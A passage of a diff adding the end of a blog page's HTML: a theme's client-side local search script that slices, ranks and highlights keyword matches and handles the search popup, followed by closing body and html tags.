+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
